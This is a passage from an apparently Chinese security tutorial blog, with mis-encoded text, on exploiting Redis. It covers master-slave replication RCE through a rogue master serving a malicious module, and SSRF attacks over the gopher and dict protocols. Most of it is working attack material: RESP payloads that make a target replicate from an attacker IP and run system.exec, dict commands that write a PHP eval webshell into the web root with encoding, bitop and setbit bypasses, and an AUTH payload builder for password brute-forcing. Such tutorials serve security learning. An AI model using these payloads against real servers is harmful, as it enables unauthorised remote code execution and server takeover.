<h3 id="ä¸»ä»å¤åˆ¶RCE"><a href="#ä¸»ä»å¤åˆ¶RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶RCE"></a>ä¸»ä»å¤åˆ¶RCE</h3><h4 id="ä¸»ä»å¤åˆ¶åŸºç¡€"><a href="#ä¸»ä»å¤åˆ¶åŸºç¡€" class="headerlink" title="ä¸»ä»å¤åˆ¶åŸºç¡€"></a>ä¸»ä»å¤åˆ¶åŸºç¡€</h4><p>ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å° Redis æœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„ Redis æœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼Œæ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ï¼Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯å°RedisæœåŠ¡å™¨éƒ½æ˜¯ä¸»èŠ‚ç‚¹ï¼Œä¸”ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªä»èŠ‚ç‚¹(æˆ–æ²¡æœ‰ä»èŠ‚ç‚¹)ï¼Œä½†ä¸€ä¸ªä»èŠ‚ç‚¹åªèƒ½æœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºå…¶ä»–èŠ‚ç‚¹çš„ä¸»èŠ‚ç‚¹ï¼Œæ­¤æ—¶å°±è¾¾æˆäº†ä¸€ä¸ªé›†ç¾¤</p>
<p>ç„¶åèµ·ä¸¤ä¸ª redis5.0 çš„ docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6301:6379 -d redis:5.0 redis-server</span><br><span class="line">docker run -p 6302:6379 -d redis:5.0 redis-server</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸»èŠ‚ç‚¹ç«¯å£ï¼š<code>master:6301</code></li>
<li>ä»èŠ‚ç‚¹ç«¯å£ï¼š<code>slave:6302</code></li>
</ul>
<p>ä»èŠ‚ç‚¹è¦å¤åˆ¶ä¸»èŠ‚ç‚¹å‘½ä»¤<code>slaveof ip port</code></p>
<p>è¦æ–­å¼€åˆ™ç”¨<code>slaveof no one</code></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214135824096.png" alt="image-20210214135824096"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹å‡ºä¸»èŠ‚ç‚¹çš„æ“ä½œä¼šå’Œä»èŠ‚ç‚¹åŒæ­¥</p>
<p>é€šå¸¸åœ¨ redis4.0 ä»¥å‰å¯ä»¥æŠŠ shell å†™è¿›ä¸»èŠ‚ç‚¹çš„é”®å€¼å¯¹é‡Œé¢ï¼Œç„¶åé€šè¿‡ä¸»ä»å¤åˆ¶æŠŠ shell å¤åˆ¶è¿‡æ¥ï¼Œè€Œåœ¨ 4.x å’Œ 5.x åˆ™å¯ä»¥é€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œæ„é€ æ¶æ„<code>.so</code>æ–‡ä»¶ï¼Œç„¶åç”¨ python èµ·ä¸€ä¸ªæœåŠ¡å»æ¨¡æ‹Ÿ redis çš„ä¸»èŠ‚ç‚¹ï¼Œå¹¶ä¸”åœ¨å…¨é‡å¤åˆ¶çš„æ—¶å€™æŠŠæ•°æ®åº“æ–‡ä»¶æ›¿æ¢æˆæ¶æ„<code>.so</code>æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ° rce</p>
<h4 id="ä¸»ä»å¤åˆ¶ä¸€é”®RCE"><a href="#ä¸»ä»å¤åˆ¶ä¸€é”®RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶ä¸€é”®RCE"></a>ä¸»ä»å¤åˆ¶ä¸€é”®RCE</h4><ul>
<li>é…åˆæ¨¡å—åŠ è½½ rce</li>
</ul>
<p>åœ¨é…åˆä¸»ä»å¤åˆ¶ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹æ¨¡å—åŠ è½½æ˜¯ä»€ä¹ˆå›äº‹ï¼Œredis ä» 4.0 ç‰ˆæœ¬å¼€å§‹åŠ å…¥äº†å¯¹å¤–éƒ¨æ‰©å±•æ¨¡å—çš„æ”¯æŒï¼Œæ¨¡å—çš„åŠ è½½æ–¹å¼ï¼š</p>
<ol>
<li><p>ä¸€ç§æ˜¯åœ¨é…ç½®æ–‡ä»¶<code>redis.conf</code>ä¸­ä½¿ç”¨<code>loadmodule /path/to/mymodule.so</code>åœ¨ redis å¯åŠ¨æ—¶åŠ è½½</p>
</li>
<li><p>å¦ä¸€ç§æ–¹å¼åœ¨è¿è¡Œæ—¶ä½¿ç”¨å‘½ä»¤<code>MODULE LOAD /path/to/mymodule.so</code>åŠ è½½ã€‚åŠ è½½çš„æ¨¡å—å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>MODULE LIST</code>æŸ¥çœ‹ï¼Œä½¿ç”¨<code>MODULE UNLOAD mymodule</code>å¸è½½</p>
</li>
</ol>
<p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æŠŠ<code>.so</code>æ–‡ä»¶å¤åˆ¶åˆ°å®¹å™¨é‡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp &#x2F;home&#x2F;kawhi&#x2F;jiaoben&#x2F;RedisModules-ExecuteCommand-master&#x2F;module.so modest_nobel:&#x2F;data&#x2F;exp.so</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module load &#x2F;data&#x2F;exp.so</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218110907979.png" alt="image-20210218110907979"></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æ¼æ´åˆ©ç”¨æˆåŠŸ</p>
<p>å†è¯´å›åˆ°ä¸»ä»å¤åˆ¶ä¸­ï¼Œä¸»èŠ‚ç‚¹å¯ä»¥é€šè¿‡ fullresync ï¼ˆå…¨é‡å¤åˆ¶ï¼‰åŒæ­¥<code>.so</code>æ–‡ä»¶åˆ°ä»èŠ‚ç‚¹ä¸Šï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼Œå¤ç°è¿‡ç¨‹éœ€è¦ä¸¤ä¸ªè„šæœ¬ï¼š</p>
<p>ç”Ÿæˆ<code>.so</code>æ–‡ä»¶ï¼š<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p>æ¶æ„ç«¯ï¼š<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a> æˆ–è€… <a target="_blank" rel="noopener" href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a> æˆ–è€… <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> è„šæœ¬éƒ½å·®ä¸å¤šéšä¾¿é€‰ä¸€ä¸ªå³å¯ï¼Œè¿™é‡Œæˆ‘ç”¨çš„ç¬¬äºŒä¸ª</p>
<p>åŸç†å°±æ˜¯é€šè¿‡æ¨¡æ‹Ÿæ¶æ„æœåŠ¡ç«¯æ¥ä½œä¸ºä¸»èŠ‚ç‚¹ï¼Œå¹¶æ¨¡æ‹Ÿ fullresync è¯·æ±‚ï¼Œæˆ‘ä»¬å°†ç”Ÿæˆçš„<code>so</code>æ–‡ä»¶æ”¾åˆ°æ¶æ„ç«¯çš„è„šæœ¬ç›®å½•ä¸‹ï¼Œç„¶åè¿è¡Œ</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214180724613.png" alt="image-20210214180724613"></p>
<p>ç„¶åä½¿ç”¨ <code>system.exec &quot;whoami&quot;</code> çš„å½¢å¼æ¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210214180806891.png" alt="image-20210214180806891"></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<h2 id="SSRFä¸redis"><a href="#SSRFä¸redis" class="headerlink" title="SSRFä¸redis"></a>SSRFä¸redis</h2><p>ssrf æ‰“ redis å°±æ˜¯å°†ä¸Šé¢çš„æœªæˆæƒè®¿é—®çš„ä¸€äº›æ–¹æ³•ä¼ªé€ æˆ redis çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œç¼–ç ï¼Œå†é€šè¿‡ gopher åè®®ç­‰å‘é€åˆ°å­˜åœ¨ redis çš„æœåŠ¡å™¨ä¸Š</p>
<h3 id="gopheråè®®çš„åˆ©ç”¨"><a href="#gopheråè®®çš„åˆ©ç”¨" class="headerlink" title="gopheråè®®çš„åˆ©ç”¨"></a>gopheråè®®çš„åˆ©ç”¨</h3><p>gopher åè®®é»˜è®¤ç«¯å£æ˜¯70ï¼Œå› ä¸ºä»–æ”¯æŒå¤šè¡Œæ‰€ä»¥éœ€è¦åŠ ä¸€ä¸ªå­—ç¬¦è¢«ä»–åƒæ‰ï¼Œä½¿ç”¨æ ¼å¼<code>gopher://ip:port/_data</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ¥å‘é€ redis çš„æ•°æ®ï¼Œæ¯”å¦‚è®¾ç½®ä¸€ä¸ªé”®å€¼å¯¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;*3</span></span><br><span class="line"><span class="string">$3</span></span><br><span class="line"><span class="string">set</span></span><br><span class="line"><span class="string">$5</span></span><br><span class="line"><span class="string">kawhi</span></span><br><span class="line"><span class="string">$3</span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">print(result)</span><br><span class="line"><span class="comment">#_%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Akawhi%0D%0A%243%0D%0A123%0D%0A</span></span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218120854014.png" alt="image-20210218120854014"></p>
<h4 id="gopheråè®®çŒœæµ‹å¼±å£ä»¤"><a href="#gopheråè®®çŒœæµ‹å¼±å£ä»¤" class="headerlink" title="gopheråè®®çŒœæµ‹å¼±å£ä»¤"></a>gopheråè®®çŒœæµ‹å¼±å£ä»¤</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gopher åè®®æ¥çŒœæµ‹ redis çš„å¼±å£ä»¤</p>
<p>é¦–å…ˆåœ¨<code>redis-cli</code>è¿ä¸Šä¹‹åä½¿ç”¨<code>config set requirepass &quot;123456&quot;</code>è®¾ç½® redis çš„å¯†ç </p>
<p>æˆ–è€…ç›´æ¥ä¿®æ”¹<code>redis.conf</code>æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;#requirepass 123456&#x2F;requirepass 123456&#x2F;g&#39; &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è®¾ç½®å¥½å¯†ç ä¹‹åå¯ä»¥æŠ“åŒ…çœ‹åˆ°å…¶å®æ˜¯å‘é€äº†è¿™ä¹ˆä¸€æ®µå‘½ä»¤</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218222540246.png" alt="image-20210218222540246"></p>
<p>è€Œè¿™æ˜¯å¯ä»¥è¿›è¡Œä¼ªé€ çš„ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;*2</span></span><br><span class="line"><span class="string">$4</span></span><br><span class="line"><span class="string">AUTH</span></span><br><span class="line"><span class="string">$6</span></span><br><span class="line"><span class="string">123456</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¯†ç æ­£ç¡®çš„è¯ï¼Œä¼šå›æ˜¾+ok</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/1.jpg" alt="1"></p>
<p>å¯†ç é”™è¯¯åˆ™ä¼šæŠ¥é”™</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/2.jpg" alt="2"></p>
<p>ç”±æ­¤æˆ‘ä»¬ç”šè‡³å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥çˆ†ç ´å¼±å£ä»¤</p>
<h4 id="gopheråè®®ä¸»ä»å¤åˆ¶"><a href="#gopheråè®®ä¸»ä»å¤åˆ¶" class="headerlink" title="gopheråè®®ä¸»ä»å¤åˆ¶"></a>gopheråè®®ä¸»ä»å¤åˆ¶</h4><p>å› ä¸ºæˆ‘ä»¬éœ€è¦å°†<code>slave of</code>å‘½ä»¤é€šè¿‡ ssrf çš„ gopher åè®®å‘åˆ°ç›®æ ‡æœºä¸Šï¼Œæ‰€ä»¥æ²¡åŠæ³•åƒä¸Šé¢ä¸€æ ·ç”¨è„šæœ¬ä¸€é”®rceï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªè¢«åŠ¨è¿æ¥çš„ä¸»æœºæ¥è¿›è¡Œä¸»ä»å¤åˆ¶ï¼Œè„šæœ¬åœ°å€<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆåœ¨ redis çš„å®¢æˆ·ç«¯è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¡Œï¼Œå¦‚ä¸‹</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219200608137.png" alt="image-20210219200608137"></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219200655247.png" alt="image-20210219200655247"></p>
<p>å‘ç°å·²ç»æ¼æ´æˆåŠŸåˆ©ç”¨ï¼Œç„¶åå†æŠŠä¸Šé¢çš„å‘½ä»¤è½¬æˆ redis çš„åè®®æ ¼å¼ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$5</span><br><span class="line">&#x2F;tmp&#x2F;</span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$6</span><br><span class="line">exp.so</span><br><span class="line">*3</span><br><span class="line">$7</span><br><span class="line">slaveof</span><br><span class="line">$13   &#x2F;&#x2F;ipé•¿åº¦</span><br><span class="line">192.168.2.105 &#x2F;&#x2F;ip</span><br><span class="line">$5   &#x2F;&#x2F;ç«¯å£é•¿åº¦</span><br><span class="line">21000 &#x2F;&#x2F;ç«¯å£</span><br><span class="line">*3</span><br><span class="line">$6</span><br><span class="line">module</span><br><span class="line">$4</span><br><span class="line">load</span><br><span class="line">$11</span><br><span class="line">&#x2F;tmp&#x2F;exp.so</span><br><span class="line">*2</span><br><span class="line">$11</span><br><span class="line">system.exec</span><br><span class="line">$2</span><br><span class="line">id</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>å†ç”¨ä¸Šé¢çš„è„šæœ¬ç¼–ç å³å¯</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210219203616444.png" alt="image-20210219203616444"></p>
<h4 id="gopheråè®®å…¶ä»–éƒ¨åˆ†"><a href="#gopheråè®®å…¶ä»–éƒ¨åˆ†" class="headerlink" title="gopheråè®®å…¶ä»–éƒ¨åˆ†"></a>gopheråè®®å…¶ä»–éƒ¨åˆ†</h4><p>å‰©ä½™éƒ¨åˆ†çš„æœªæˆæƒè®¿é—®åˆ©ç”¨ä¹Ÿæ˜¯å·®ä¸å¤šçš„ï¼Œå°±ä¸èµ˜è¿°äº†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä»¥ä¸‹å·¥å…·ç¼–ç </p>
<p>å¯ä»¥webshell\å®šæ—¶ä»»åŠ¡\å¯†é’¥\æ¨¡å—åŠ è½½ç­‰åŠŸèƒ½ï¼Œåœ°å€ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher</a></p>
<p>æˆ–è€…è¿™ä¸ªå·¥å…·gopheruså¯ä»¥webshell\å®šæ—¶ä»»åŠ¡ä¸€é”®ç”Ÿæˆ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<h3 id="dictåè®®çš„åˆ©ç”¨"><a href="#dictåè®®çš„åˆ©ç”¨" class="headerlink" title="dictåè®®çš„åˆ©ç”¨"></a>dictåè®®çš„åˆ©ç”¨</h3><p>æˆ‘ä»¬çŸ¥é“ dict åè®®é€šå¸¸æ˜¯å¯ä»¥ç”¨æ¥æ¢æµ‹ç«¯å£ä¿¡æ¯çš„ï¼Œä¾‹å¦‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218123601252.png" alt="image-20210218123601252"></p>
<p>ä½†æ˜¯ dict åè®®è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯åˆ©ç”¨æ ¼å¼å¦‚<code>dict://serverip:port/å‘½ä»¤:å‚æ•°</code> æ¥å‘é€ redis å‘½ä»¤ï¼Œä¾‹å¦‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;dict:&#x2F;&#x2F;192.168.2.107:6379&#x2F;set:kawhi:123456&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>:</code>ä¹Ÿå¯ä»¥æ¢æˆç©ºæ ¼</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218124917794.png" alt="image-20210218124917794"></p>
<h4 id="dictåè®®å†™shell"><a href="#dictåè®®å†™shell" class="headerlink" title="dictåè®®å†™shell"></a>dictåè®®å†™shell</h4><p>å¦‚æœæˆ‘ä»¬æ¢æˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;dict:&#x2F;&#x2F;192.168.2.107:6379&#x2F;set:shell:&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>ä¼šå‘ç°åªæ¥æ”¶åˆ°ä¸€éƒ¨åˆ†ï¼Œ<code>?</code>å·åé¢è¢«æˆªæ–­äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.107:6379&gt; get shell</span><br><span class="line">&quot;&lt;&quot;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥ç»•è¿‡</p>
<ul>
<li>ç¬¬ä¸€ç§</li>
</ul>
<p>è¿™é‡Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« çš„ç»•è¿‡æ–¹æ³•ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a></p>
<p>ä¸»è¦æ˜¯æŠŠ<code>&lt;?</code>ç­‰ç‰¹æ®Šç¬¦å·è½¬ä¹‰ç¼–ç äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">link.php?u&#x3D;dict:&#x2F;&#x2F;0:6379&#x2F;set:shell:&quot;\x3C\x3Fphp\x20echo&#96;$_GET[x]&#96;\x3B\x3F\x3E&quot;</span><br><span class="line">link.php?u&#x3D;dict:&#x2F;&#x2F;0:6379&#x2F;config:set:dir:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">link.php?u&#x3D;dict:&#x2F;&#x2F;0:6379&#x2F;config:set:dbfilename:shell.php</span><br><span class="line">link.php?u&#x3D;dict:&#x2F;&#x2F;0:6379&#x2F;save</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬äºŒç§</li>
</ul>
<p>å¯ä»¥å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247483865&idx=1&sn=41e56040229e383a82a671fc359ee82b&chksm=f9ee6d66ce99e470d102becfcf63955f2aae1d88bc43ef8e7939bc93d786ff2f994eac969d32&scene=126&sessionid=1586255695&key=c00e1a5b49adb240be940797e7d3cb821bae9b89771be268faa858b2888bbba3e96562ccac53df81389cb41e548a9e6412d4f83b6b7b541825630aa6ace9d1d040a3b7cd677b5ca137cc9b1d2297948e&ascene=1&uin=MzE0MDM4MzExMw==&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=A6a52QI1M4H5IGXp8ekqTtY=&pass_ticket=awXcPg/ApqlfbrG8njT11ZZYAGjwbhrnExtbvARh//rtbsupQLnZBKBPE6SCXvhn">ä¸€æ¬¡â€SSRFâ€“&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨</a></p>
<p>è¿™é‡Œä¸»è¦æ˜¯ç”¨ bitop å‘½ä»¤ç»•è¿‡<code>?</code>æˆªæ–­</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210218204928277.png" alt="image-20210218204928277"></p>
<p>bitop å¯ä»¥å°† key è¿›è¡ŒAND(é€»è¾‘å¹¶)ã€OR(é€»è¾‘æˆ–)ã€XOR(é€»è¾‘å¼‚æˆ–)ã€NOT(é€»è¾‘é)å››ç§æ“ä½œä¸­çš„ä»»æ„ä¸€ç§ï¼Œå°†ç»“æœä¿å­˜åˆ° destkey ä¸Šï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºéƒç¦»æ­Œå¸ˆå‚…çš„ payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;set:shell:&quot;\xc3\xc0\x8f\x97\x8f\xdf\xbf\x9a\x89\x9e\x93\xd7\xdb\xa0\xaf\xb0\xac\xab\xa4\xce\xa2\xd6\xc4\xc0\xc1&quot;</span><br><span class="line">dict:&#x2F;&#x2F;0:6379&#x2F;bitop:not:shell:shell</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å†™å…¥äº†ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.112:6379&gt; get shell</span><br><span class="line">&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸‰ç§</li>
</ul>
<p>ä¸»è¦æ˜¯åˆ©ç”¨ setbit æ”¹åŠ¨äºŒè¿›åˆ¶çš„ä½ç½®å³å¯æŠŠå­—ç¬¦å˜å›ç‰¹æ®Šå­—ç¬¦</p>
<p>Redis Setbit å‘½ä»¤ç”¨äºå¯¹ key æ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ï¼Œè®¾ç½®æˆ–æ¸…é™¤æŒ‡å®šåç§»é‡ä¸Šçš„ä½(bit)</p>
<p>è¿™é‡Œç›´æ¥ç»™å‡ºéƒç¦»æ­Œå¸ˆå‚…çš„ payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set webshell &quot;&lt;&gt;php @eval($_POST[1]);&gt;&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; setbit webshell 191 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit webshell 15 1</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h4 id="dictåè®®ä¸»ä»å¤åˆ¶"><a href="#dictåè®®ä¸»ä»å¤åˆ¶" class="headerlink" title="dictåè®®ä¸»ä»å¤åˆ¶"></a>dictåè®®ä¸»ä»å¤åˆ¶</h4><p>å’Œä¸Šé¢å·®ä¸å¤šï¼Œè¿™é‡Œæå‰åœ¨ä¸»èŠ‚ç‚¹è®¾ç½®ä¸€ä¸ªé”®å€¼å¯¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.112:6301&gt; set shell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨<code>dict</code>åè®®è¿›è¡Œä¸»ä»å¤åˆ¶</p>
